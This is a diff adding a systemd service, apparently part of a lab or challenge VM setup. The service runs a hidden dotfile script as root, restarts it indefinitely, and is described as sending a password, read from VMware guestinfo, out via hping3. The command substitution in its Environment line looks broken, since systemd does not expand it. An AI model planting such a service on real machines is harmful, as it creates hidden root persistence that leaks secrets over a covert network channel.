@@ -1,0 +1,17 @@
+[Unit]
+Description=Send password via hping3
+After=network.target
+
+[Service]
+ExecStart=/home/user/Documents/.ping.sh
+Restart=always
+User=root
+Group=root
+StandardOutput=syslog
+StandardError=syslog
+SyslogIdentifier=ping
+Environment="PASSWORD=$(vmtoolsd --cmd 'info-get guestinfo.zippass')"
+
+[Install]
+WantedBy=multi-user.target
+
